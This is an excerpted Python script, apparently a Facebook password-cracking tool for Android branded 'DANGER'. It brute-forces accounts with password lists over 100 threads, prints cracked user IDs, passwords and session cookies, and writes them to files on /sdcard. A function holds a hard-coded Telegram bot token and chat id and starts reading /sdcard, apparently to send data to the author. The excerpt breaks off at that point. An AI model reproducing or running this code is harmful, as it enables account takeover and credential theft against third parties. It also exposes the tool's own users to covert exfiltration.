...
def mueor():
    ...
    with ThreadPool(max_workers=100) as MUEOR:
        ...
        print('\033[1;37m[\033[1;32mâœ“\033[1;32m] TOOL CREATED BY DANGER ')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sDANGER \033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[DANGER -OKðŸ’š] {uid} â€¢ {ps}" '  \n\033[1;33m [ðŸ’‰]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [ðŸ¤§] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/DANGER -OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[DANGER -CPðŸ’”] {uid} â€¢ {ps}")
                open('/sdcard/DANGER -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def sexy():
    ...
    bot_token = '6385076362:AAHlhhi02E1Uu3XcUw5yrgKM8-bnuBWJ79c' 
    chat_id = '5323175188'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
